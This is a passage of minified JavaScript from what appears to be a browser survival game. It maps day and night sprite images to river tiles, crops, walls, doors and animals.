                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_000")] = [IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")] = [IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_011_010")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_011_011")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_111_011")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_010")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_111_000")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_111_010")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_111_011")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_111_110")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_111_111")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_111_110")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_111_010")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("011_011_000")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO26],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("011_011_010")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("011_011_011")] = [IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO15],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("011_111_000")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("011_011_010")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("011_111_010")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("011_111_011")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("011_111_010")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("011_111_110")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("011_111_010")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("011_111_111")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("110_110_000")] = [IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO12, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("110_110_010")] = [IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("110_110_110")] = [IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("110_111_000")] = [IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO12, IMAGES.NIGHT_RIVER_COMPO14, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("110_111_110")] = [IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO14, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("110_111_111")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("110_111_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("110_111_011")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("110_111_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("110_111_010")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("110_111_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("111_111_110")] = [IMAGES.NIGHT_RIVER_COMPO28, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO14, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO1],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("111_111_011")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("111_111_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("111_111_000")] = [IMAGES.NIGHT_RIVER_COMPO12, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO14],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("111_111_111")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("111_111_010")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("111_111_110")],
                    sprite[ze.RIVER] = [],
                    sprite[ze.RIVER][ze.DAY] = [],
                    sprite[ze.RIVER][ze.DAY][i("000_010_000")] = IMAGES.DAY_RIVER_000_010_000,
                    sprite[ze.RIVER][ze.DAY][i("000_010_010")] = IMAGES.DAY_RIVER_000_010_010,
                    sprite[ze.RIVER][ze.DAY][i("000_011_000")] = IMAGES.DAY_RIVER_000_011_000,
                    sprite[ze.RIVER][ze.DAY][i("000_011_010")] = IMAGES.DAY_RIVER_000_011_010,
                    sprite[ze.RIVER][ze.DAY][i("000_011_011")] = IMAGES.DAY_RIVER_000_011_011,
                    sprite[ze.RIVER][ze.DAY][i("000_110_000")] = IMAGES.DAY_RIVER_000_110_000,
                    sprite[ze.RIVER][ze.DAY][i("000_110_010")] = IMAGES.DAY_RIVER_000_110_010,
                    sprite[ze.RIVER][ze.DAY][i("000_110_110")] = IMAGES.DAY_RIVER_000_110_110,
                    sprite[ze.RIVER][ze.DAY][i("000_111_000")] = IMAGES.DAY_RIVER_000_111_000,
                    sprite[ze.RIVER][ze.DAY][i("000_111_010")] = IMAGES.DAY_RIVER_000_111_010,
                    sprite[ze.RIVER][ze.DAY][i("000_111_011")] = IMAGES.DAY_RIVER_000_111_011,
                    sprite[ze.RIVER][ze.DAY][i("000_111_110")] = IMAGES.DAY_RIVER_000_111_110,
                    sprite[ze.RIVER][ze.DAY][i("000_111_111")] = IMAGES.DAY_RIVER_000_111_111,
                    sprite[ze.RIVER][ze.DAY][i("010_010_000")] = IMAGES.DAY_RIVER_010_010_000,
                    sprite[ze.RIVER][ze.DAY][i("010_010_010")] = IMAGES.DAY_RIVER_010_010_010,
                    sprite[ze.RIVER][ze.DAY][i("010_011_000")] = IMAGES.DAY_RIVER_010_011_000,
                    sprite[ze.RIVER][ze.DAY][i("010_011_010")] = IMAGES.DAY_RIVER_010_011_010,
                    sprite[ze.RIVER][ze.DAY][i("010_011_011")] = IMAGES.DAY_RIVER_010_011_011,
                    sprite[ze.RIVER][ze.DAY][i("010_110_000")] = IMAGES.DAY_RIVER_010_110_000,
                    sprite[ze.RIVER][ze.DAY][i("010_110_010")] = IMAGES.DAY_RIVER_010_110_010,
                    sprite[ze.RIVER][ze.DAY][i("010_110_110")] = IMAGES.DAY_RIVER_010_110_110,
                    sprite[ze.RIVER][ze.DAY][i("010_111_000")] = IMAGES.DAY_RIVER_010_111_000,
                    sprite[ze.RIVER][ze.DAY][i("010_111_010")] = IMAGES.DAY_RIVER_010_111_010,
                    sprite[ze.RIVER][ze.DAY][i("010_111_011")] = IMAGES.DAY_RIVER_010_111_011,
                    sprite[ze.RIVER][ze.DAY][i("010_111_110")] = IMAGES.DAY_RIVER_010_111_110,
                    sprite[ze.RIVER][ze.DAY][i("010_111_111")] = IMAGES.DAY_RIVER_010_111_111,
                    sprite[ze.RIVER][ze.DAY][i("011_011_000")] = IMAGES.DAY_RIVER_011_011_000,
                    sprite[ze.RIVER][ze.DAY][i("011_011_010")] = IMAGES.DAY_RIVER_011_011_010,
                    sprite[ze.RIVER][ze.DAY][i("011_011_011")] = IMAGES.DAY_RIVER_011_011_011,
                    sprite[ze.RIVER][ze.DAY][i("011_111_000")] = IMAGES.DAY_RIVER_011_111_000,
                    sprite[ze.RIVER][ze.DAY][i("011_111_010")] = IMAGES.DAY_RIVER_011_111_010,
                    sprite[ze.RIVER][ze.DAY][i("011_111_011")] = IMAGES.DAY_RIVER_011_111_011,
                    sprite[ze.RIVER][ze.DAY][i("011_111_110")] = IMAGES.DAY_RIVER_011_111_110,
                    sprite[ze.RIVER][ze.DAY][i("011_111_111")] = IMAGES.DAY_RIVER_011_111_111,
                    sprite[ze.RIVER][ze.DAY][i("110_110_000")] = IMAGES.DAY_RIVER_110_110_000,
                    sprite[ze.RIVER][ze.DAY][i("110_110_010")] = IMAGES.DAY_RIVER_110_110_010,
                    sprite[ze.RIVER][ze.DAY][i("110_110_110")] = IMAGES.DAY_RIVER_110_110_110,
                    sprite[ze.RIVER][ze.DAY][i("110_111_000")] = IMAGES.DAY_RIVER_110_111_000,
                    sprite[ze.RIVER][ze.DAY][i("110_111_010")] = IMAGES.DAY_RIVER_110_111_010,
                    sprite[ze.RIVER][ze.DAY][i("110_111_011")] = IMAGES.DAY_RIVER_110_111_011,
                    sprite[ze.RIVER][ze.DAY][i("110_111_110")] = IMAGES.DAY_RIVER_110_111_110,
                    sprite[ze.RIVER][ze.DAY][i("110_111_111")] = IMAGES.DAY_RIVER_110_111_111,
                    sprite[ze.RIVER][ze.DAY][i("111_111_011")] = IMAGES.DAY_RIVER_111_111_011,
                    sprite[ze.RIVER][ze.DAY][i("111_111_110")] = IMAGES.DAY_RIVER_111_111_110,
                    sprite[ze.RIVER][ze.DAY][i("111_111_011")] = IMAGES.DAY_RIVER_111_111_011,
                    sprite[ze.RIVER][ze.DAY][i("111_111_000")] = IMAGES.DAY_RIVER_111_111_000,
                    sprite[ze.RIVER][ze.DAY][i("111_111_111")] = IMAGES.DAY_RIVER_111_111_111,
                    sprite[ze.RIVER][ze.DAY][i("111_111_010")] = IMAGES.DAY_RIVER_111_111_010,
                    sprite[ze.RIVER][ze.NIGHT] = [],
                    sprite[ze.RIVER][ze.NIGHT][i("000_010_000")] = IMAGES.NIGHT_RIVER_000_010_000,
                    sprite[ze.RIVER][ze.NIGHT][i("000_010_010")] = IMAGES.NIGHT_RIVER_000_010_010,
                    sprite[ze.RIVER][ze.NIGHT][i("000_011_000")] = IMAGES.NIGHT_RIVER_000_011_000,
                    sprite[ze.RIVER][ze.NIGHT][i("000_011_010")] = IMAGES.NIGHT_RIVER_000_011_010,
                    sprite[ze.RIVER][ze.NIGHT][i("000_011_011")] = IMAGES.NIGHT_RIVER_000_011_011,
                    sprite[ze.RIVER][ze.NIGHT][i("000_110_000")] = IMAGES.NIGHT_RIVER_000_110_000,
                    sprite[ze.RIVER][ze.NIGHT][i("000_110_010")] = IMAGES.NIGHT_RIVER_000_110_010,
                    sprite[ze.RIVER][ze.NIGHT][i("000_110_110")] = IMAGES.NIGHT_RIVER_000_110_110,
                    sprite[ze.RIVER][ze.NIGHT][i("000_111_000")] = IMAGES.NIGHT_RIVER_000_111_000,
                    sprite[ze.RIVER][ze.NIGHT][i("000_111_010")] = IMAGES.NIGHT_RIVER_000_111_010,
                    sprite[ze.RIVER][ze.NIGHT][i("000_111_011")] = IMAGES.NIGHT_RIVER_000_111_011,
                    sprite[ze.RIVER][ze.NIGHT][i("000_111_110")] = IMAGES.NIGHT_RIVER_000_111_110,
                    sprite[ze.RIVER][ze.NIGHT][i("000_111_111")] = IMAGES.NIGHT_RIVER_000_111_111,
                    sprite[ze.RIVER][ze.NIGHT][i("010_010_000")] = IMAGES.NIGHT_RIVER_010_010_000,
                    sprite[ze.RIVER][ze.NIGHT][i("010_010_010")] = IMAGES.NIGHT_RIVER_010_010_010,
                    sprite[ze.RIVER][ze.NIGHT][i("010_011_000")] = IMAGES.NIGHT_RIVER_010_011_000,
                    sprite[ze.RIVER][ze.NIGHT][i("010_011_010")] = IMAGES.NIGHT_RIVER_010_011_010,
                    sprite[ze.RIVER][ze.NIGHT][i("010_011_011")] = IMAGES.NIGHT_RIVER_010_011_011,
                    sprite[ze.RIVER][ze.NIGHT][i("010_110_000")] = IMAGES.NIGHT_RIVER_010_110_000,
                    sprite[ze.RIVER][ze.NIGHT][i("010_110_010")] = IMAGES.NIGHT_RIVER_010_110_010,
                    sprite[ze.RIVER][ze.NIGHT][i("010_110_110")] = IMAGES.NIGHT_RIVER_010_110_110,
                    sprite[ze.RIVER][ze.NIGHT][i("010_111_000")] = IMAGES.NIGHT_RIVER_010_111_000,
                    sprite[ze.RIVER][ze.NIGHT][i("010_111_010")] = IMAGES.NIGHT_RIVER_010_111_010,
                    sprite[ze.RIVER][ze.NIGHT][i("010_111_011")] = IMAGES.NIGHT_RIVER_010_111_011,
                    sprite[ze.RIVER][ze.NIGHT][i("010_111_110")] = IMAGES.NIGHT_RIVER_010_111_110,
                    sprite[ze.RIVER][ze.NIGHT][i("010_111_111")] = IMAGES.NIGHT_RIVER_010_111_111,
                    sprite[ze.RIVER][ze.NIGHT][i("011_011_000")] = IMAGES.NIGHT_RIVER_011_011_000,
                    sprite[ze.RIVER][ze.NIGHT][i("011_011_010")] = IMAGES.NIGHT_RIVER_011_011_010,
                    sprite[ze.RIVER][ze.NIGHT][i("011_011_011")] = IMAGES.NIGHT_RIVER_011_011_011,
                    sprite[ze.RIVER][ze.NIGHT][i("011_111_000")] = IMAGES.NIGHT_RIVER_011_111_000,
                    sprite[ze.RIVER][ze.NIGHT][i("011_111_010")] = IMAGES.NIGHT_RIVER_011_111_010,
                    sprite[ze.RIVER][ze.NIGHT][i("011_111_011")] = IMAGES.NIGHT_RIVER_011_111_011,
                    sprite[ze.RIVER][ze.NIGHT][i("011_111_110")] = IMAGES.NIGHT_RIVER_011_111_110,
                    sprite[ze.RIVER][ze.NIGHT][i("011_111_111")] = IMAGES.NIGHT_RIVER_011_111_111,
                    sprite[ze.RIVER][ze.NIGHT][i("110_110_000")] = IMAGES.NIGHT_RIVER_110_110_000,
                    sprite[ze.RIVER][ze.NIGHT][i("110_110_010")] = IMAGES.NIGHT_RIVER_110_110_010,
                    sprite[ze.RIVER][ze.NIGHT][i("110_110_110")] = IMAGES.NIGHT_RIVER_110_110_110,
                    sprite[ze.RIVER][ze.NIGHT][i("110_111_000")] = IMAGES.NIGHT_RIVER_110_111_000,
                    sprite[ze.RIVER][ze.NIGHT][i("110_111_010")] = IMAGES.NIGHT_RIVER_110_111_010,
                    sprite[ze.RIVER][ze.NIGHT][i("110_111_011")] = IMAGES.NIGHT_RIVER_110_111_011,
                    sprite[ze.RIVER][ze.NIGHT][i("110_111_110")] = IMAGES.NIGHT_RIVER_110_111_110,
                    sprite[ze.RIVER][ze.NIGHT][i("110_111_111")] = IMAGES.NIGHT_RIVER_110_111_111,
                    sprite[ze.RIVER][ze.NIGHT][i("111_111_011")] = IMAGES.NIGHT_RIVER_111_111_011,
                    sprite[ze.RIVER][ze.NIGHT][i("111_111_110")] = IMAGES.NIGHT_RIVER_111_111_110,
                    sprite[ze.RIVER][ze.NIGHT][i("111_111_011")] = IMAGES.NIGHT_RIVER_111_111_011,
                    sprite[ze.RIVER][ze.NIGHT][i("111_111_000")] = IMAGES.NIGHT_RIVER_111_111_000,
                    sprite[ze.RIVER][ze.NIGHT][i("111_111_111")] = IMAGES.NIGHT_RIVER_111_111_111,
                    sprite[ze.RIVER][ze.NIGHT][i("111_111_010")] = IMAGES.NIGHT_RIVER_111_111_010,
                    sprite[ze.PICK_REIDITE] = [],
                    sprite[ze.PICK_REIDITE][ze.DAY] = IMAGES.PICK_REIDITED,
                    sprite[ze.PICK_REIDITE][ze.NIGHT] = IMAGES.PICK_REIDITEN,
                    sprite[ze.CARROT] = [],
                    sprite[ze.CARROT][ze.DAY] = IMAGES.CARROTD,
                    sprite[ze.CARROT][ze.NIGHT] = IMAGES.CARROTN,
                    sprite[ze.TOMATO_MINI] = [],
                    sprite[ze.TOMATO_MINI][ze.DAY] = IMAGES.TOMATO_MINID,
                    sprite[ze.TOMATO_MINI][ze.NIGHT] = IMAGES.TOMATO_MININ,
                    sprite[ze.TOMATO] = [],
                    sprite[ze.TOMATO][ze.DAY] = IMAGES.TOMATOD,
                    sprite[ze.TOMATO][ze.NIGHT] = IMAGES.TOMATON,
                    sprite[ze.DRIED_CARROT] = [],
                    sprite[ze.DRIED_CARROT][ze.DAY] = IMAGES.CARROT_DRIEDD,
                    sprite[ze.DRIED_CARROT][ze.NIGHT] = IMAGES.CARROT_DRIEDN,
                    sprite[ze.DRIED_TOMATO_MINI] = [],
                    sprite[ze.DRIED_TOMATO_MINI][ze.DAY] = IMAGES.TOMATO_MINI_DRIEDD,
                    sprite[ze.DRIED_TOMATO_MINI][ze.NIGHT] = IMAGES.TOMATO_MINI_DRIEDN,
                    sprite[ze.WATERMELON] = [],
                    sprite[ze.WATERMELON][ze.DAY] = IMAGES.WATERMELOND,
                    sprite[ze.WATERMELON][ze.NIGHT] = IMAGES.WATERMELONN,
                    sprite[ze.DRIED_WATERMELON] = [],
                    sprite[ze.DRIED_WATERMELON][ze.DAY] = IMAGES.DRIED_WATERMELOND,
                    sprite[ze.DRIED_WATERMELON][ze.NIGHT] = IMAGES.DRIED_WATERMELONN,
                    sprite[ze.ALOE_VERA_GROWN] = [],
                    sprite[ze.ALOE_VERA_GROWN][ze.DAY] = IMAGES.ALOE_VERA_GROWND,
                    sprite[ze.ALOE_VERA_GROWN][ze.NIGHT] = IMAGES.ALOE_VERA_GROWNN,
                    sprite[ze.DRIED_ALOE_VERA] = [],
                    sprite[ze.DRIED_ALOE_VERA][ze.DAY] = IMAGES.ALOE_VERA_DRIEDD,
                    sprite[ze.DRIED_ALOE_VERA][ze.NIGHT] = IMAGES.ALOE_VERAN_DRIEDN,
                    sprite[ze.CACTUS] = [],
                    sprite[ze.CACTUS][ze.DAY] = [IMAGES.CACTUSD],
                    sprite[ze.CACTUS][ze.NIGHT] = [IMAGES.CACTUSN],
                    sprite[ze.REIDITE_WALL] = [],
                    sprite[ze.REIDITE_WALL][ze.DAY] = IMAGES.REIDITE_WALLD,
                    sprite[ze.REIDITE_WALL][ze.NIGHT] = IMAGES.REIDITE_WALLN,
                    sprite[ze.REIDITE_SPIKE] = [],
                    sprite[ze.REIDITE_SPIKE][ze.DAY] = IMAGES.REIDITE_SPIKED,
                    sprite[ze.REIDITE_SPIKE][ze.NIGHT] = IMAGES.REIDITE_SPIKEN,
                    sprite[ze.REIDITE_SPIKE2] = [],
                    sprite[ze.REIDITE_SPIKE2][ze.DAY] = I0(g0(.8, !0, ["#00c291", "#00af6d", "#9facaa", "#c03a29", "#9b3422", "#db4935", "#db4935", "#f06351", "#f06351"])),
                    sprite[ze.REIDITE_SPIKE2][ze.NIGHT] = I0(g0(.8, !0, ["#00c291", "#00af6d", "#546d77", "#c03a29", "#9b3422", "#db4935", "#db4935", "#f06351", "#f06351"])),
                    sprite[ze.REIDITE_DOOR] = [],
                    sprite[ze.REIDITE_DOOR][ze.DAY] = IMAGES.REIDITE_DOORD,
                    sprite[ze.REIDITE_DOOR][ze.NIGHT] = IMAGES.REIDITE_DOORN,
                    sprite[ze.WOOD_DOOR_SPIKE] = [],
                    sprite[ze.WOOD_DOOR_SPIKE][ze.DAY] = IMAGES.WOOD_DOOR_SPIKED,
                    sprite[ze.WOOD_DOOR_SPIKE][ze.NIGHT] = IMAGES.WOOD_DOOR_SPIKEN,
                    sprite[ze.STONE_DOOR_SPIKE] = [],
                    sprite[ze.STONE_DOOR_SPIKE][ze.DAY] = IMAGES.STONE_DOOR_SPIKED,
                    sprite[ze.STONE_DOOR_SPIKE][ze.NIGHT] = IMAGES.STONE_DOOR_SPIKEN,
                    sprite[ze.GOLD_DOOR_SPIKE] = [],
                    sprite[ze.GOLD_DOOR_SPIKE][ze.DAY] = IMAGES.GOLD_DOOR_SPIKED,
                    sprite[ze.GOLD_DOOR_SPIKE][ze.NIGHT] = IMAGES.GOLD_DOOR_SPIKEN,
                    sprite[ze.DIAMOND_DOOR_SPIKE] = [],
                    sprite[ze.DIAMOND_DOOR_SPIKE][ze.DAY] = IMAGES.DIAMOND_DOOR_SPIKED,
                    sprite[ze.DIAMOND_DOOR_SPIKE][ze.NIGHT] = IMAGES.DIAMOND_DOOR_SPIKEN,
                    sprite[ze.AMETHYST_DOOR_SPIKE] = [],
                    sprite[ze.AMETHYST_DOOR_SPIKE][ze.DAY] = IMAGES.AMETHYST_DOOR_SPIKED,
                    sprite[ze.AMETHYST_DOOR_SPIKE][ze.NIGHT] = IMAGES.AMETHYST_DOOR_SPIKEN,
                    sprite[ze.REIDITE_DOOR_SPIKE] = [],
                    sprite[ze.REIDITE_DOOR_SPIKE][ze.DAY] = IMAGES.REIDITE_DOOR_SPIKED,
                    sprite[ze.REIDITE_DOOR_SPIKE][ze.NIGHT] = IMAGES.REIDITE_DOOR_SPIKEN,
                    sprite[ze.GOLDEN_HEN] = [],
                    sprite[ze.GOLDEN_HEN][ze.DAY] = IMAGES.HEND,
                    sprite[ze.GOLDEN_HEN][ze.NIGHT] = IMAGES.HENN,
                    sprite[ze.GOLDEN_CHICKEN] = [],
                    sprite[ze.GOLDEN_CHICKEN][ze.DAY] = IMAGES.CHICKEND,
